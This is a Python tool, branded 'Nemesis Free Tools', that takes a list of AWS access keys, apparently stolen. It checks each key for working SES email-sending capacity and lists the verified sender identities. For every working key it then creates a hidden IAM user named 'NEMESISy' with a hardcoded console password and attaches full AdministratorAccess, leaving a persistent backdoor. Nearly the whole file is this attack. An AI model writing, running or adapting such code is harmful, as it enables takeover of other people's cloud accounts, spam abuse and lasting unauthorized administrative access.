import os, boto3, json
import requests as r
from re import findall as reg
from colorama import Fore, Style, Back
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Pool
import threading
import sys
bl = Fore.BLACK
wh = Fore.WHITE
yl = Fore.YELLOW
red = Fore.RED
res = Style.RESET_ALL
gr = Fore.GREEN
ble = Fore.BLUE

HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def screen_clear():
    if os.name == "nt":
	    os.system("cls")
    else:
	    os.system("clear")


headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0'}

screen_clear()
print(f'''
 {gr} ___  _    _ _____ _____  _   _  _____ _____  _   __ ___________ 
 / _ \| |  | /  ___/  __ \| | | ||  ___/  __ \| | / /|  ___| ___ \
/ /_\ \ |  | \ `--.| /  \/| |_| || |__ | /  \/| |/ / | |__ | |_/ /
|  _  | |/\| |`--. \ |    |  _  ||  __|| |    |    \ |  __||    / 
| | | \  /\  /\__/ / \__/\| | | || |___| \__/\| |\  \| |___| |\ \ 
\_| |_/\/  \/\____/ \____/\_| |_/\____/ \____/\_| \_/\____/\_| \_|
                                            {wh}Nemesis Free Tools
                                            {yl}GitHub : MataKucing-OFC  
''')

link = input(f'{gr}Give Me Your Aws_Keys.txt{res}@{red}NEMESIS> {gr}${res} ')
with open(link) as fp:
    for star in fp:
        if not star:
           pass
        try:
            star = star.rstrip()
            data = star.split('\n')[0].split('|')
            email = data[0]
            password = data[1]
            region = data[2]
            client = boto3.client(
		    'ses'
		    ,aws_access_key_id=email
		    ,aws_secret_access_key=password
		    ,region_name = region)
            data = (f" ACCOUNT : {email} | {password} | {region} ")
            print(f"{yl}{data}{res}")
            response = client.get_send_quota()
            print(f"{gr} ACCOUNT ACTIVE!")
            limit =  (f"Max Send email 24 Hours: {response['Max24HourSend']} ")
            ddd = client.list_verified_email_addresses(
            )
            getEmailListVer = (f"Email Verification from mail:{ddd['VerifiedEmailAddresses']}")
            print(getEmailListVer)
            response = client.list_identities(
            IdentityType='EmailAddress',
		    MaxItems=123,
		    NextToken='',
		    )

            listemail = (f"Email: {response['Identities']}")
            print(listemail)
            statistic = client.get_send_statistics()
            getStatistic = (f"Email Sent Today Ini:{statistic['SendDataPoints']}")
            print(getStatistic)
            print("All Data")
            xxx = email+"|"+password+"|"+region + "|" +  limit +"|" + listemail
            print(xxx)
            remover = str(xxx).replace('\r', '')
            simpan = open('Results/Active.txt', 'a')
            simpan.write(remover+'\n\n')
            simpan.close()
            ValidData = email + ":" + password + ":" + region
            remover = str(ValidData).replace('\r', '')
            SimpValid = open('Results/TryCreate.txt', 'a')
            SimpValid.write(remover+'\n\n')
            SimpValid.close()
            totz  = len(SimpValid)
            print("Total SimpValid: " + totz)
            response = client.list_users(
            )
            print(response)
        except:
            print(f"{red} ACCOUNT DIE!{res}")
            pass

print(f"{ble}Let's Create IAM Aws Dashbord{res}")

with open('Results/TryCreate.txt', 'r') as fp:
    for star in fp:
        if not star:
           pass
        try:
            star = star.rstrip()
            DataValid = star.split('\n')[0].split(':')
            UsernameLogin = "NEMESISy"
            user = DataValid[0]
            keyacces = DataValid[1]
            regionz = DataValid[2]
            client = boto3.client(
            'iam'
            ,aws_access_key_id=user
            ,aws_secret_access_key=keyacces
            ,region_name = regionz)
            data = " [ACCOUNT]{}|{}|{}".format(user,keyacces,regionz)
            print(f"{ble}{data}{res}")
            Create_user = client.create_user(
            UserName=UsernameLogin,
            )
            print(f"{gr}SUCCESS CREATE CONSOLE IAM LET'S GO TO DASHBOARD!{res}")
            bitcg = (f"User: {Create_user['User'] ['UserName']}")
            xxxxcc = (f"User: {Create_user['User'] ['Arn']}")
            print(f"{gr}bitcg{res}")
            print(f"{gr}xxxxcc{res}")
            print(f"{gr}Create_user{res}")
            pws = "NEMESISy55hmido#1ejeg2shehhe"
            print(f"{gr}Username = {UsernameLogin}{res}")
            print(f"{yl}create acces login for {UsernameLogin}{res}")
            Buat = client.create_login_profile(
            Password=pws,
            PasswordResetRequired=False,
            UserName=UsernameLogin
            )
            print(Buat)
            print("password:" + pws)
            print("give access  User to Admin")
            Admin = client.attach_user_policy(
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
            UserName=UsernameLogin,
            )
            xxx = UsernameLogin+"|"+pws+"|"+bitcg + "|" +  xxxxcc
            print(xxx)
            remover = str(xxx).replace('\r', '')
            simpan = open('Results/!IAM_Account.txt', 'a')
            simpan.write(remover+'\n\n')
            simpan.close()
            print(Admin)
        except:
            pass